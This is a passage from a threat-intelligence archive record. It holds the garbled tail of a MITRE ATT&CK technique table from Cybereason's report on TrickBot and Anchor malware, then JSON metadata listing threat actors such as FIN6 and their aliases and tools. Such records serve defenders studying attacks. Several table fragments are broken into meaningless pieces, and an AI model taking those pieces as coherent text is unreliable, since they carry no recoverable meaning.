Private\nKeys\n\n\nQuery\nRegistry\n\nSystem\n[Information](https://attack.mitre.org/techniques/T1082)\nDiscovery\n\nPermission\n[Groups](https://attack.mitre.org/techniques/T1069)\nDiscovery\n\nAccount\nDiscovery\n\nDomain\n[Trust](https://attack.mitre.org/techniques/T1482)\nDiscovery\n\n\nClipboard\nData\n\n\nExfiltration\nOver\nAlternative\nProtocol\n\n\nDa\nEn\n\nDa\nO\n\nSt\nAp\nLa\nPr\n\nRe\nCo\n\nU\nUs\n\n\nScheduled\nTask\n\nExecution\nthrough API\n\nCommand-Line\nInterface\n\n\nBrowser\nExtensions\n\nProcess\nInjection\n\n\nScheduled\nTask\n\nBypass User\n[Account](https://attack.mitre.org/techniques/T1088)\nControl\n\nAccess\nToken\nManipulation\n\n\nDeobfuscate/Decode\nFiles or Information\n\n\nCredential\nDumping\n\n\n[PowerShell](https://attack.mitre.org/techniques/T1086) Bypass User\nAccount Control\n\n\n[Rundll32](https://attack.mitre.org/techniques/T1085) [Masquerading](https://attack.mitre.org/techniques/T1036) Co\nUs\n\n[Scripting](https://attack.mitre.org/techniques/T1064) [NTFS File Attributes](https://attack.mitre.org/techniques/T1096)\n\n\nWindows\n[Management](https://attack.mitre.org/techniques/T1047)\nInstrumentation\n\nExecution\n[through](https://attack.mitre.org/techniques/T1129)\nModule Load\n\n\nAccess Token\nManipulation\n\n\n**Cybereason Nocturnus**\n\nThe Cybereason Nocturnus Team has brought the world’s brightest minds from the military, government intelligence, and enterprise security to\nuncover emerging threats across the globe. They specialize in analyzing new attack methodologies, reverse-engineering malware, and\nexposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and\nBad Rabbit cyberattacks.\n\n[All Posts by Cybereason Nocturnus](https://www.cybereason.com/blog/authors/cybereason-nocturnus)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-12-11 - Dropping Anchor- From a TrickBot Infection to the Discovery of the Anchor Malware.pdf"
    ],
    "report_names": [
        "2019-12-11 - Dropping Anchor- From a TrickBot Infection to the Discovery of the Anchor Malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ee3363a4-e807-4f95-97d8-b603c31b9de1",
            "created_at": "2023-01-06T13:46:38.485884Z",
            "updated_at": "2025-03-27T02:00:02.845851Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "Camouflage Tempest",
                "MageCart Group 6",
                "G0037",
                "TA4557",
                "SKELETON SPIDER",
                "ITG08",
                "White Giant",
                "GOLD FRANKLIN",
                "ATK88"
            ],
            "source_name": "MISPGALAXY:FIN6",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "12517c87-040a-4627-a3df-86ca95e5c13f",
            "created_at": "2022-10-25T16:07:23.61665Z",
            "updated_at": "2025-03-27T02:02:09.889471Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "ATK 88",
                "Camouflage Tempest",
                "FIN6",
                "Gold Franklin",
                "ITG08",
                "Skeleton Spider",
                "TAAL",
                "TAG-CR2",
                "White Giant"
            ],
            "source_name": "ETDA:FIN6",
            "tools": [
                "AbaddonPOS",
                "Agentemis",
                "AmmyyRAT",
                "Anchor_DNS",
                "BlackPOS",
                "CmdSQL",
                "Cobalt Strike",
                "CobaltStrike",
                "FlawedAmmyy",
                "FrameworkPOS",
                "Grateful POS",
                "JSPSPY",
                "Kaptoxa",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LockerGoga",
                "MMon",
                "Magecart",
                "Meterpreter",
                "Mimikatz",
                "More_eggs",
                "NeverQuest",
                "POSWDS",
                "Reedum",
                "Ryuk",
                "SCRAPMINT",
                "SONE",
                "SpicyOmelette",
                "StealerOne",
                "Taurus Loader Stealer Module",
                "Terra Loader",
                "TerraStealer",
                "Vawtrak",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "cobeacon",
                "grabnew"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b3acfb48-b04d-4d3d-88a8-836d7376fa2e",
            "created_at": "2024-06-19T02:03:08.052814Z",
            "updated_at": "2025-03-27T02:05:17.368029Z",
            "deleted_at": null,
            "main_name": "GOLD FRANKLIN",
            "aliases": [
                "ITG08 ",
                "MageCart Group 6 ",
                "Skeleton Spider ",
                "White Giant ",
                "FIN6 "
            ],
            "source_name": "Secureworks:GOLD FRANKLIN",
            "tools": [
                " Metasploit",
                " Meterpreter",
                " Mimikatz",
                " PowerSploit",
                " PowerUpSQL",
                " RemCom",
                "FrameWorkPOS"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ea7bfe06-7c23-481d-b8ba-eafa6cda3bc9",
            "created_at": "2022-10-25T15:50:23.317961Z",
            "updated_at": "2025-03-27T02:00:55.440858Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "FIN6",
                "Magecart Group 6",
                "ITG08",
                "Skeleton Spider",
                "TAAL",
                "Camouflage Tempest"
            ],
            "source_name": "MITRE:FIN6",
            "tools": [
                "FlawedAmmyy",
                "GrimAgent",
                "FrameworkPOS",
                "More_eggs",
                "Cobalt Strike",
                "Windows Credential Editor",
                "AdFind",
                "PsExec",
                "LockerGoga",
                "Ryuk",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536033,
    "ts_updated_at": 1743041713,
    "ts_creation_date": 1653693021,
    "ts_modification_date": 1653693021,
    "files": {
        "pdf": "https://archive.orkl.eu/fc3e9e34d4333180afa08cd25d6e89ac52d5613f.pdf",
        "text": "https://archive.orkl.eu/fc3e9e34d4333180afa08cd25d6e89ac52d5613f.txt",
        "img": "https://archive.orkl.eu/fc3e9e34d4333180afa08cd25d6e89ac52d5613f.jpg"
    }
}